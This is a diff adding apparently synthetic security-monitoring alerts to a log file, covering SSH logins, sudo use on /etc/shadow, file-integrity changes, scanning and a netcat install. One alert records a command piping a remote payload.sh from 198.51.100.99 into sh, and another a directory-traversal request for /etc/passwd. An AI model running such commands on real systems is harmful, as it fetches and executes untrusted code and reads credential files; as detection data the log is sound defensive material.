@@ -49,3 +49,138 @@ Logon Type: 3
 Src IP: 10.0.0.50
 Location: Security
 Agent ID: 010
+
+** Alert 1678912600.1122334: - system,cron,
+2026 Jan 27 09:20:00 (ubuntu-server) 192.168.1.10->/var/log/syslog
+Rule: 5001 (level 4) -> 'Unexpected cron execution detected.'
+User: root
+Command: /usr/local/bin/cleanup.sh
+Location: /var/log/syslog
+Agent ID: 001
+
+** Alert 1678912625.3344556: - web,apache,
+2026 Jan 27 09:20:25 (web-server) 192.168.1.20->/var/log/apache2/access.log
+Rule: 31110 (level 5) -> 'Unusual HTTP response size detected.'
+Src IP: 198.51.100.77
+URL: /download/file.zip
+Method: GET
+HTTP Status: 200
+Location: /var/log/apache2/access.log
+Agent ID: 002
+
+** Alert 1678912666.2233445: - sshd,authentication_success,
+2026 Jan 27 09:21:06 (ubuntu-server) 192.168.1.10->/var/log/auth.log
+Rule: 5716 (level 6) -> 'Successful SSH login outside business hours.'
+Src IP: 203.0.113.90
+User: admin
+Dst Port: 22
+Protocol: tcp
+Location: /var/log/auth.log
+Agent ID: 001
+
+** Alert 1678912699.5544332: - sudo,
+2026 Jan 27 09:21:39 (ubuntu-server) 192.168.1.10->/var/log/auth.log
+Rule: 5404 (level 7) -> 'Suspicious use of sudo command.'
+User: alice
+Command: /usr/bin/vi /etc/shadow
+Location: /var/log/auth.log
+Agent ID: 001
+
+** Alert 1678912740.3322110: - system,auditd,
+2026 Jan 27 09:22:20 (ubuntu-server) 192.168.1.10->/var/log/audit/audit.log
+Rule: 5540 (level 8) -> 'File integrity alert: binary modified.'
+File: /usr/bin/passwd
+Old hash: ae3f9a...
+New hash: c01f54...
+Location: /var/log/audit/audit.log
+Agent ID: 001
+
+** Alert 1678912788.4455661: - web,apache,
+2026 Jan 27 09:23:08 (web-server) 192.168.1.20->/var/log/apache2/error.log
+Rule: 31175 (level 6) -> 'Multiple 404 errors from same IP - scanning activity.'
+Src IP: 203.0.113.200
+Count: 27
+Location: /var/log/apache2/error.log
+Agent ID: 002
+
+** Alert 1678912830.7766554: - system,kernel,
+2026 Jan 27 09:23:50 (ubuntu-server) 192.168.1.10->/var/log/kern.log
+Rule: 12100 (level 5) -> 'Kernel module loaded: unusual driver.'
+Module: vboxguest.ko
+User: root
+Location: /var/log/kern.log
+Agent ID: 001
+
+** Alert 1678912888.8877665: - windows,security,
+2026 Jan 27 09:24:48 (win-client01) 10.0.0.15->WinEvtLog
+Rule: 18115 (level 8) -> 'Account locked due to repeated login failures.'
+Event ID: 4740
+User: DOMAIN\bob
+Src IP: 10.0.0.50
+Location: Security
+Agent ID: 010
+
+** Alert 1678912940.5544337: - web,apache,
+2026 Jan 27 09:25:40 (web-server) 192.168.1.20->/var/log/apache2/access.log
+Rule: 31130 (level 7) -> 'Attempted directory traversal.'
+Src IP: 203.0.113.55
+URL: /../../etc/passwd
+Method: GET
+HTTP Status: 403
+Location: /var/log/apache2/access.log
+Agent ID: 002
+
+** Alert 1678912981.2233446: - sshd,authentication_failed,
+2026 Jan 27 09:26:21 (ubuntu-server) 192.168.1.10->/var/log/auth.log
+Rule: 5712 (level 9) -> 'Multiple failed SSH logins from unknown host.'
+Src IP: 192.0.2.67
+Dst Port: 22
+Protocol: tcp
+User: test
+Location: /var/log/auth.log
+Agent ID: 001
+
+** Alert 1678913033.9988774: - system,package,
+2026 Jan 27 09:27:13 (ubuntu-server) 192.168.1.10->/var/log/dpkg.log
+Rule: 5555 (level 4) -> 'New package installed.'
+User: alice
+Package: netcat
+Version: 1.218-4ubuntu1
+Location: /var/log/dpkg.log
+Agent ID: 001
+
+** Alert 1678913088.1112227: - network,firewall,
+2026 Jan 27 09:28:08 (router-core) 192.168.1.1->/var/log/ufw.log
+Rule: 6022 (level 6) -> 'Blocked inbound connection attempt.'
+Src IP: 198.51.100.45
+Src Port: 445
+Dst Port: 445
+Protocol: tcp
+Location: /var/log/ufw.log
+Agent ID: 099
+
+** Alert 1678913140.8899776: - system,process,
+2026 Jan 27 09:29:00 (ubuntu-server) 192.168.1.10->/var/log/syslog
+Rule: 6200 (level 5) -> 'Unexpected process started by user.'
+User: www-data
+Command: bash -c 'curl -s http://198.51.100.99/payload.sh | sh'
+Location: /var/log/syslog
+Agent ID: 001
+
+** Alert 1678913189.3332212: - windows,system,
+2026 Jan 27 09:29:49 (win-client02) 10.0.0.16->WinEvtLog
+Rule: 18155 (level 6) -> 'USB device connected.'
+Event ID: 20001
+Device: Kingston_DT_16GB
+User: DOMAIN\carla
+Location: System
+Agent ID: 011
+
+** Alert 1678913233.5566777: - linux,systemd,
+2026 Jan 27 09:30:33 (ubuntu-server) 192.168.1.10->/var/log/syslog
+Rule: 5535 (level 8) -> 'Service restart detected for sshd.'
+Service: sshd
+User: root
+Reason: Unexpected termination, auto-restarted by systemd
+Location: /var/log/syslog
+Agent ID: 001
